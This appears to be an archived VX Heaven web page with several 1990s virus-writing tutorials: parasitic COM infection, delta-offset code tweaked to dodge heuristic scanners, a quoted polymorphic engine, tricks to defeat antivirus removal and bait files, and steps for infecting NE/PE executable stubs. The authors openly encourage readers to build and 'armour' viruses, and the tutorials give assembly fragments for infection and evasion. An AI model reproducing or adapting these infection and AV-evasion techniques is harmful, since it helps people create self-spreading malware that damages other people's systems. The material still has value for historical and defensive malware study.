<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Jerk1N 'Jerk1N's Tutorial Series' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Jerk1N"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Jerk1N,Jerk1N's Tutorial Series, bait, call, offset, header, infection, infect, file, bytes, word, byte, code, jerk, exit, trick, files"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"f9bd6288cb25d7e8e887ed442404ca9ed4e7932c-1498756644-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vjn01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Jerk1N's Tutorial Series</h1><p><a href="/lib/?lang=en&amp;author=Jerk1N"> Jerk1N</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vjn01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vjn01">Back to index</a>] [<a href="/lib/vjn01.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#p1">Jerk1N's Tutorial On Parasitic COM Infection</a>
<ul>
<li><a href="#p11">What To Save</a></li>
<li><a href="#p12">Jumping to the Virus</a></li>
<li><a href="#p13">Extra Trix</a></li>
</ul></li>
<li><a href="#p2">Jerk1N's Tutorial On Memory Addressing</a>
<ul>
<li><a href="#p21">A good Question</a></li>
</ul></li>
<li><a href="#p3">Jerk1N's Tutorial On Anti-Removal</a>
<ul>
<li><a href="#p31">Trick 1: Polymorphism</a></li>
<li><a href="#p32">Trick 2: JVS/Virus Scrambling</a></li>
<li><a href="#p33">Trick 3: Embedding</a></li>
<li><a href="#p34">Trick 4: TSR Middle Finger Salute</a></li>
<li><a href="#p35">Conclusion</a></li>
<li><a href="#p36">Greetz</a></li>
</ul></li>
<li><a href="#p4">Ice Breaker's Tutorial On Anti-Bait Coding</a>
<ul>
<li><a href="#p41">SECTION 1: DTA Closed File Methods</a>
<ul>
<li><a href="#p411">Trick 1: File Size Checking</a></li>
<li><a href="#p412">Trick 2: Standard Bait Filenames</a></li>
</ul></li>
<li><a href="#p42">SECTION 2: Open File Methods</a>
<ul>
<li><a href="#p421">Trick 1: Exit Now!</a></li>
<li><a href="#p422">Trick 2: Do-Nothing till the day you Die</a></li>
</ul></li>
<li><a href="#p43">Conclusion</a></li>
<li><a href="#p44">Greetz</a></li>
</ul></li>
<li><a href="#p5">Ice Breaker's Tutorial On NE EXE Infection</a>
<ul>
<li><a href="#p51">The Concept</a></li>
<li><a href="#p52">Stepz of Infection</a></li>
<li><a href="#p53">Restoring the Host</a></li>
<li><a href="#p54">Conclusion</a></li>
<li><a href="#p56">Greetz</a></li>
</ul></li>
</ul>
<h2><a name="p1">Jerk1N's Tutorial On Parasitic COM Infection</a></h2>
<p>I won't blast out all assembly stuff in your face, I assume you can at least write an overwritting virus in assembly.</p>
<h3><a name="p11">What To Save</a></h3>
<p>Okay, in a standard COM infection, the first 3 bytes must be saved, so read them and place them in a empty area (WITHIN THE VIRUS! NOT IN THE HEAP!), as a default you should have 3 bytes -</p>
<pre class="source">
	orig3 db 0CDh,20h,00h
</pre>
<p>These 3 MUST be restored before reading the new 3 bytes, this is done by -</p>
<pre class="source">
	mov di,100h
	lea si,[bp+offset orig3]	;Assuming BP contains delta offset
	movsw
	movsb
</pre>
<p>Why 3? Well a jump statement in ASM compiled is a 1 byte statement with a 2 byte address, so 3 bytes to jump to your virus is needed.</p>
<h3><a name="p12">Jumping to the Virus</a></h3>
<p>The best whay to make sure your jump is 3 bytes long is to type it in in DB statements -</p>
<pre class="source">
start:
	db 0E9h,00h,00h
</pre>
<p>So these 3 bytes overwrite the bytes you have saved. BEFORE you write them, this is one thing I forgot about in Lone.Vengance at first, you must LSEEK to the END of the file to get the address of where you are jumping to and replace the two 00h bytes with the new address. Just remember to LSEEK back to the beginning before you write the 3 bytes, else you'll be writting them to the end of the file, and that's NOT what we want. After this LSEEK to the end of the file and write the virus.</p>
<h3><a name="p13">Extra Trix</a></h3>
<p>If you look at my Lone.Vengance virus, I save 6 bytes instead of 3! The reason is that I have 05h,00h,00h so I could use these for checking if I had already infected the selected file.</p>
<p>If you have any comments, questions etc. just EMail me at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3f555a4d540e517f4b4d4a4c4b12525a115c5052">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
<p>DIFFUSION's website - http://uk.zarcrom.com/freehome/jerk1n</p>
<h2><a name="p2">Jerk1N's Tutorial On Memory Addressing</a></h2>
<p>The first thing to do in a virus (and any other program which might need it!) is to get the DELTA OFFSET, this internally shows us the location in memory and will be the basis for accessing parts of the virus. To get the Delta Offset we must use some code like this -</p>
<pre class="source">
	call $+3
	pop bp
	sub bp,offset $-1
</pre>
<p>OR</p>
<pre class="source">
	call getdo
getdo:	pop bp
	sub bp,offset getdo
</pre>
<p>Unfortunatly ThunderByte has stuck this in their heuristic scanner so a flag is set if this is found. Of course us virii programers work around everything so the code would be like this -</p>
<pre class="source">
	call $+3
	pop si
	sub si,offset $-1
	xchg si,bp
</pre>
<p>OR</p>
<pre class="source">
	call $+3
c:	pop si
	xchg si,bp
	sub bp,offset c
</pre>
<p>OR</p>
<pre class="source">
	call c
c:	pop si
	xchg si,bp
	sub bp,offset c
</pre>
<p>BTW - You don't have to use SI as the tempory register, it's just one I picked for this example.</p>
<p>Once this is done, any section of your virus can be accessed from anywhere. The step to do this is simple -</p>
<p>Instead of -</p>
<pre class="source">
	lea dx,[offset filespec]
</pre>
<p>use -</p>
<pre class="source">
	lea dx,[bp+offset filespec]
</pre>
<p>NOTE - You MUST include the square brackets!!!!</p>
<h3><a name="p21">A good Question</a></h3>
<p><strong>Q. When do I use LEA and when do I use MOV?</strong></p>
<p>A. When accessing a sub-routine or interrupt call which requires a POINTER</p>
<p>eg.</p>
<pre>
	INT 21 - DOS 2+ - FIND FIRST ASCIZ (FIND FIRST)
	DX = pointer to ASCIZ filename
</pre>
<p>then you will require a LEA as you will want to Load an Exact Address. I don't think LEA stands for that but it's the easiest way to remember it. However, If you want the VALUE STORED at an address then use MOV to put the value AT the given address INTO the selected variable. eg.</p>
<pre class="source">
100h
100h jmp tk
103h joke db 05h,05h
105h tk:
107h lea dx,[bp+offset joke] ;DX = 0103h (ADDRESS Of joke)
10Ah mov dx,[bp+offset joke] ;DX = 0505h (Word @ Joke offset)
</pre>
<p>Need any more help? Just Mail me Jerk1N, of DIFFUSION Virus Team (<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6d07081f065c032d191f181e19400008430e0200">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>)</p>
<p>"Life is anything which dies when you stomp on it!" - Jerk1N</p>
<p>http://uk.zarcrom.com/freehome/jerk1n - DIFFUSION HomePage</p>
<h2><a name="p3">Jerk1N's Tutorial On Anti-Removal</a></h2>
<p>Well, I'm back again.... Your probably getting bored stiff with the shit that I write in here! BUT hold on, this one might actually do some good! Now then, where was I? Oh yes, Anti-Removal... Okay, if a virus is to survive it needs to eliminate all ways of eliminating it so.......</p>
<h3><a name="p31">Trick 1: Polymorphism</a></h3>
<p>Well, this doesn't work to great now-a-days, now AV have started developing software which undoes the engine BUT doesn't execute the virus! If you make your own engine, then you might get a bit further, but not much. Polymorphism was designed so viruses couldn't be string scanned, this also helped to take out removal because it'd be different every time. I don't like polymorphism to be honest, which is what lead me to my JVS....</p>
<p>Example of a polmorphic engine, taken from the MARIANO virus by Super/29A This is probably the smallest engine!</p>
<pre class="source">
;------------> here starts poly engine &lt;------------;
;
	call get_delta					;
get_delta:						;
	pop si						;
	sub si,(offset get_delta-offset vir_start)	;
	mov di,dx					;
	mov bp,10bh					;
	call garbage					;
	and cl,ah					;
	mov al,0beh					;
	xor al,cl					;
	stosb						;
	in ax,40h					;
	stosw						;
	sub bp,ax					;
	call garbage					;
	mov ax,0b480h					;
	xor ah,cl					;
	stosw						;
	xchg bp,ax					;
	stosw						;
	mov eax,0f8794600h				;
	or ah,cl					;
	in al,40h					;
	stosd						;
	mov cx,vir_length				;
decrypt: 						;
	movs byte ptr es:[di],cs:[si]			;
	xor byte ptr [di-1],al				;
	loop decrypt					;
;
;-------------> here ends poly engine &lt;-------------;

garbage proc
	inc bp
	inc bp
	in ax,40h
	and al,111b
	or al,0b0h
	stosw
	jp garbage
	ret
garbage endp
</pre>
<h3><a name="p32">Trick 2: JVS/Virus Scrambling</a></h3>
<p>Rock and roll! I had invented a new way to hide viruses! However, v1 and v1.3 were very limited and had 2 states, scrambled and de-scrambled. v2 will be random, it'll take bytes from random address' and switch them around. This will provide a remarkable hiding and anti-removal tool. JVS v2 will be release as soon as I can find the bug which screws it up!</p>
<h3><a name="p33">Trick 3: Embedding</a></h3>
<p>This *MIGHT* work, if so it'd rule! Okay, how it works is this. The virus opens up the file, shifts up the file from the middle, and adds itself to the middle of the file then lowering the code down for execution (if COM). I have a feeling it wouldn't work with EXE's but maybe with COM's! This will also avoid most AV software, because from what I can gather, AV scan beginning and end of the files ONLY!!</p>
<h3><a name="p34">Trick 4: TSR Middle Finger Salute</a></h3>
<p>I like that name! )8-D.... Okay, this is a trick I've designed ages ago, I never use it 'cos I don't make ressy viruses! Don't know why not, I just don't. To really KICK ASS, use tunneling to gain the original INT 21h vector, hook it, now when checking for OPEN FILE and EXECUTE (and others you watch) also check for the RE-VECTOR, if an AV tries to remove your code by switching the direction of the INT 21h call then tell your virus to call INT 24h! Watch the AV get screwed up as it cannot clean up.....</p>
<h3><a name="p35">Conclusion</a></h3>
<p>If I can remember any more, I might make AR2.TXT! That poly engine is kewl... Well done Super!</p>
<h3><a name="p36">Greetz</a></h3>
<ul>
<li>Cenobyte Have you started World War ]I[? |8-D</li>
<li>Cicatrix Brill Site Man! Keep it rolling! (Also keep <a href="/lib/vcc00.html">VDAT</a> up-to-date!)</li>
<li>Crack's Whore Are you just gonna sit there?</li>
<li>Dark Mage How about you?</li>
<li>Foxz Hey, wanna put this in your news letter?</li>
<li>HamDan Wong Are we gonna see virus production?</li>
<li>Lot M Where's this TSR? Still working on it?</li>
<li>mach 1 Hey, can you give me some of your 25 grand? ;)</li>
<li>Mike Lopez Have you got anything on your site yet?</li>
<li>Nuclii Where's that bloody interview?</li>
<li>Patrick Mullen Thanx for the support, I'm in mixed state at the minute!</li>
<li>Slage Hammer Huh, what can I say? G'day! Thanx for all the stuff!</li>
<li>Smuilt GodSquad lacked, learn ASM and produce more!! ;)</li>
<li>Synthesia Hello? Are you in DIFFUSION?</li>
<li>VicodinES Anxiety.Poppy.IV SE rulez man!!! Thanx for AccessiV info!</li>
<li>Virus You are fucking crazy! I suggest you cool down!</li>
</ul>
<pre>
				Cool down,
				Jerk1N
</pre>
<h2><a name="p4">Ice Breaker's Tutorial On Anti-Bait Coding</a></h2>
<p>Well, I'm back! (Jerk1N?) I'm here again to advance your knowledge in virus production, giving your viruses the edge in "The Wild"! So do you know what a bait file is? Yes, well skip this bit! No? Okay, A bait file are files created especially to capture/isolate your viruses so a scan string can be created for it. It also allows AV ppl (I'm not as aggresive to them anymore, as they help spread my name!) to get your superior coding (Hey, d'ya want some support?).</p>
<p>I am *VERY* supprised over the number of viruses which incorperate this tricks, they are often small so I think they are invaluable. The only reason my Straight Life is the first to include Anti-Bait is because I didn't really need it. Most only had a simple encryption algorythm, S. Life contains 3 encryptors working in different ways! (None are polymorphic though)</p>
<h3><a name="p41">SECTION 1: DTA Closed File Methods</a></h3>
<h4><a name="p411">Trick 1: File Size Checking</a></h4>
<p>Very small files don't appear on a system for a reason! So assume that they are bait. Simple bait files are usually up to 10 bytes long for a COM. I've NEVER seen a bait file for DOS EXE's, PE EXE's, or NE EXE's... That's 'cos all MY attempts failed! But now there are problems, Files are being "Padded" to increase the size but are coded so they still exit without doing anything. I recommend you DON'T infect COM's under 1kb and EXE's under 4kb, however you must vary these amounts according to the amount of armour on your virus. The problem is, if you set the values too high, you'll lose valuable files to infect when it's not being "Baited".... Be Carefull!</p>
<pre class="source">
FSC:
;Set your DTA to the virus!
;Get your file into the DTA
;I assume BP is Delta Offset and DTA is the DTA's Label!

;If it's EXE use this -
	cmp byte ptr [bp+offset DTA+1Bh],10h	;4Kb
	jle Find_Next				;Find next file!
	jmp Infect				;It's clear to infect!

;If it's a COM use this -
	cmp byte ptr [bp+offset DTA+1Bh],4h	;1Kb, I think!
	jle Find_Next				;Find next file!
	jmp Infect				;It's clear to infect!
</pre>
<h4><a name="p412">Trick 2: Standard Bait Filenames</a></h4>
<p>Well, How many EXE's or COM's do you have on your harddisk labeled '00000000.COM', '00000001.COM'... hey? None, except for those generators which come with some polymorphic engines. I think it's stupid to provide generators, It's okay to show somebody the differences in the products BUT it also gives the AV ppl the ability to generate THOUSANDS of copies of the engine and working out an algorythm which will pin-point that exact engine! Any of these files in 1 directory gets suspicious! So avoiding them is a must check my sample taken from my Straight Life virus, I knew it'd come in handy for something!</p>
<pre class="source">
-----SNIP------
isbait:
	xor ax,ax
	lea bx,[bp+offset dta+1Fh]
	xor dx,dx
	mov cx,07h

isl:	inc dx
	cmp byte ptr [bx],byte ptr [bx-1h]	;Is it a consistant character?
	jne safe
	cmp byte ptr [bx],' '
	je tb
	cmp byte ptr [bx],'.'
	je tb

	inc ax					;Same as previous, Increase Flag

safe:	inc bx
	loop isl
tb:
	mov cx,08h
	sub cx,dx				;CX Holds name length
	dec cx					;Check last character for different
	cmp ax,cx
	jge getnext				;Is *Probably* Bait, so avoid!

;Go on to check File Size! Another Anti-Bait tactic!
-----SNIP------
</pre>
<h3><a name="p42">SECTION 2: Open File Methods</a></h3>
<h4><a name="p421">Trick 1: Exit Now!</a></h4>
<p>The easiest way to check for a bait file... Works best with COM's, I've not yet tried it with EXE's. When reading in the first few bytes of the file during COM infection check for CDh 20h or check for the INT 21h Exit calls (There are a couple, AH=4Ch, AH=00h).. anyway if these are found at the beginning of the file, somehow I seem to think these are bait files. Don't you? Yes? Good, at least we're getting somewhere! :)</p>
<p>For EXE's it'll be slightly different, you'll have to find the code's starting offset, LSEEK there (move the file pointer), read in about 5 bytes and check for these exit routines.... Guarantueed to fin 100% of bait files using a quick Exit To Dos! If any of you creates a rountine to find EXE bait files using this method, please can you send me a sample, my address is at the bottom.</p>
<h4><a name="p422">Trick 2: Do-Nothing till the day you Die</a></h4>
<p>Very simple this, read in about 10 bytes of the code section, COM is at the beginning of the file, EXE code will have to be calculated from details in the header. Check all ten bytes for code which contains Do-Nothing code, eg. is a load of NOPs (90h) or are push-pop (eg. Push Ax, Pop Ax)... These are used so the program can hit the Exit code near the end of the coding without crashing the computer and bombing the program out etc. These are also Junk Code statements used by poly. engines so BE CAREFULL!</p>
<p>To check all these Do-Nothing Op-Codes, I suggest you implement a Polymorhic Engine's Junk Code Generator and use it to get Junk code to compare with in the file!</p>
<h3><a name="p43">Conclusion</a></h3>
<p>Well, I'm exhausted... Think what you will of these tricks, and I'd love to see more anti-bait coding in viruses, they just seem to be getting Lamer and Lamer! Where have all the "veteran" coders gone? I suggest that you ppl producing over-writer's all the time LEARN! Those who are moving on to Parasitic stuff, keep going! Those who have started on the hard stuff, PE EXE's, Win95/NT/98 compatability, Start armouring your viruses!</p>
<p>There is a complete lack of armouring in viruses now-a-days.. Also, the simple stealth is being missed out, changing file dates back is one MAJOR example... Oh that reminds me, I gotta put that into Straight Life...</p>
<p>Well, you got more of my knowledge, I hope it was worth it! USE THIS CODE, OR SOME WHICH DO THE SAME!! ARMOUR YOUR VIRUSES ELSE THEY WILL DIE BEFORE THEY LEAVE YOUR HOUSE!!!!!</p>
<p>Good night ppl! Come again for my next tutorial, which is on ???? ;) Keep an eye out!</p>
<h3><a name="p44">Greetz</a></h3>
<ul>
<li>Cenobyte Are you sure 10 days is good enough?</li>
<li>Cicatrix Hey, where's the DIFFUSION collection? :)</li>
<li>Crack's Whore Why don't you just finish off that last bit of coding?</li>
<li>Dark Mage Alpha stages? Are we gonna see a complete product?</li>
<li>Foxz You are one serious arse-hole! ;)</li>
<li>HamDan Wong C'mon man, get your ass moving....</li>
<li>Lot M Nice knowing ya, Goodbye my friend.. BYE!</li>
<li>Jerk1N Am I you? ;) What a give-a-way!</li>
<li>mach 1 Have you been caught? You fool!</li>
<li>Mike Lopez Where have you gone?</li>
<li>RAiD Host control was SOOOOO simple! ;)</li>
<li>Slage Hammer D'ya recieve my snail-mail yet? ;)</li>
<li>Smuilt Deep Thought is kewl, and Cicatrix has got it! heheh</li>
<li>Synthesia Sorry to here ya go my friend.... BYE!</li>
<li>VicodinES Are you still creating those little fellows?</li>
<li>Virtual Deamon Hey, Love SLAM #4!!!!!!!!</li>
<li>Virus Your CRAZY!</li>
</ul>
<pre>
				Cool down,
				1ce Breaker <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="84efe9e5c4f0ece1f2ebf6f0e1fcaae7ebe9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
</pre>
<h2><a name="p5">Ice Breaker's Tutorial On NE EXE Infection</a></h2>
<p>I have found problems within the virus community. Althought NE EXE's are dying off and PE's are taking over, I still think that NE infection should be known.. Unfortunately, I don't understand it yet, so as I write this, I'll be testing it out. I hope this will help you, as it will me. The code will be tested, but possibly buggy, Sorry but I can't do any better. The presented code will be new and unique as I have coded from scratch! So pls bare with me and my coding.</p>
<p>For you to take notice in this, I recommend you learn these first!</p>
<ol>
<li>Overwritter</li>
<li>Parasitic COM</li>
<li>Parasitic DOS EXE (Actually, Not Required)</li>
</ol>
<p>If you haven't done these, go away until you have!</p>
<p>This is not the best way to do it, but hey, it's new and unique! (And for you beginners, VERY simple!)...</p>
<h3><a name="p51">The Concept</a></h3>
<p>Infect the STUB (If you don't know what this is, please leave this, learn, then return!) with your virus (Make sure you have enough space, or make more for it). Next comes the idea of infection, Re-launch is the key-word!</p>
<h3><a name="p52">Stepz of Infection</a></h3>
<p>After you've found the EXE, and saved it's name..</p>
<ol>
<li>Open File</li>
<li>Read the entire header from offset 00h to 3Fh. Contains IMPORTANT information.</li>
<li>Check Offset 18h = 40h (@)</li>
<li>Read in the Word at 3Ch. This tells you where the NE/PE header is, This is VERY Important!</li>
<li>Get the IP address from Word Offset 8h, the IP is the only thing we need though, this tells us where the code starts for the "This program requires ...." message. This requires slight alteration - 40h Start is shown as 04h, 200h Start is shown as 20h.
<p>Simple command is load word offset 8h into ax (or any reg you want) and have on the next line - rol ax,04h</p>
<p>I know in the MZ DOS header the CS:IP was at 14h, but view as many PE's and NE's as you want, you'll notice mine works!</p></li>
<li>Now, Subtract the NE/PE Header start from the IP, This gives you the size of the available space to the virus.</li>
<li>Compare the virus size to the available space, if the space is too small you can either, leave the file, or attempt a patching (Move the file from the NE/PE header down, just enough to fit the virus in.. Remember to patch the header for the new NE/PE Header offset!). I don't recommend patching, it will require alot of disk access, probably giving away the virus!</li>
<li>Seek from the start to the NE/PE header and check it's a NE Header... If it is not, abort! (Remember, this works with PE EXE's as well!)</li>
<li>Seek from the start of the file to the beginning of the STUB</li>
<li>Write the virus! The Fun part! Hehehe</li>
<li>Seek to the NE Header.</li>
<li>Now for the new part, Eliminate the NE Text, use it to create a "Infected" Marker.</li>
<li>Close the file</li>
</ol>
<h3><a name="p53">Restoring the Host</a></h3>
<p>This is easy! Now, if you've been good, and remembered to save the name, The virus should have the current EXE's name in it. All you do now, is COPY the Host to a Unused name, such as L437GHF4.EXE, Open it, Seek to the Start of the NE Header (Save this address as well!) and Overwrite your marker with "NE" to restore it's WINDOZE code, then close the file and call an execution routine! SIMPLE!!!!</p>
<h3><a name="p54">Conclusion</a></h3>
<p>A far and winding road, but hey, from my testing it works! I'm sure you can go in and play with the NE Header, but I couldn't be arsed really! Also, I think that this method is kewl as, providing you don't patch the file, the size doesn't increase, and is more reliable than the viruses which search for chains of constants, because ALL Win files has the STUB, but they don't all have chains of constants! 100% Original Idea, 0% given code, for 3 reasons</p>
<ol>
<li>It's too simple to need to provide samples</li>
<li>A version of this code will be in the Straight Life virus</li>
<li>I'm too lazy to write it in this tutorial! HAHAHAHAHAHA</li>
</ol>
<h3><a name="p55">Last Minute Notes</a></h3>
<p>I just tried this idea with a PE file, and it works!!!!!!!!!!!!!!!!</p>
<h3><a name="p56">Greetz</a></h3>
<ul>
<li>Cenobyte Hey man, the work'll cool off soon! Stick with us!</li>
<li>Cicatrix Wanna do your own interview with me?</li>
<li>Crack's Whore Compile that fucking virus!</li>
<li>Dark Mage Why don't you tell me your problem, so I can help!</li>
<li>Foxz I **HATE** your site! ;)</li>
<li>HamDan Wong Where are you, my friend?</li>
<li>Jerk1N ???? ;)</li>
<li>Mike Lopez Why aren't you responding to my letters?</li>
<li>Opic Kewl viruses my friend, talk soon?</li>
<li>RAiD What did ya think of Hellphoria?</li>
<li>Rajaat If you read this, please mail me....</li>
<li>SerialKiller Why don't my ICQ messages go through to you?</li>
<li>Slage Hammer You need England on my address to reach me... :)</li>
<li>Smuilt Where's the re-write of your database?</li>
<li>SPo0ky Found the SDK's and DDK's yet? ;)</li>
<li>VicodinES Where are you? Not seen you for ages..</li>
<li>Virtual Deamon Slam #5?</li>
<li>Virus How's AccessiV.C doing on the BBS? ;)</li>
</ul>
<pre>
			Cool down to the ice level,
			][ce Breaker <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d2b9bfb392a6bab7a4bda0a6b7aafcb1bdbf">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
</pre>
[<a style="" href="/lib/?lang=EN&amp;index=DO#vjn01">Back to index</a>] [<a href="/lib/vjn01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vjn01">de</a><a href="/lib/index.php?lang=en&amp;id=vjn01">en</a><a href="/lib/index.php?lang=es&amp;id=vjn01">es</a><a href="/lib/index.php?lang=it&amp;id=vjn01">it</a><a href="/lib/index.php?lang=fr&amp;id=vjn01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vjn01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vjn01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vjn01">ua</a></div>
</body>
</html>
